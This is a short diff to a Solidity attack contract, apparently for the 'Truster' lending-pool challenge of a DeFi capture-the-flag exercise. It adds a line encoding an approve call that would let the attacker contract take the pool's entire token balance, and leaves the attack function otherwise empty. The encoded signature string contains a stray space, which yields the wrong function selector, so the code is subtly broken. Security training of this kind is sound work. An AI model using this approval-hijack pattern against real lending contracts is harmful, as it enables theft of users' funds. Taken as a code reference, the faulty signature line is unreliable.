@@ -9,6 +9,8 @@ contract AttackTruster {
     function attack(IERC20 token, TrusterLenderPool pool) public {
         uint256 poolBalance = token.balanceOf(address(pool));
 
+        bytes memory approvePayload = abi.encodeWithSignature("approve(address, uint256)", address(this), poolBalance);
+
         
     }
 }
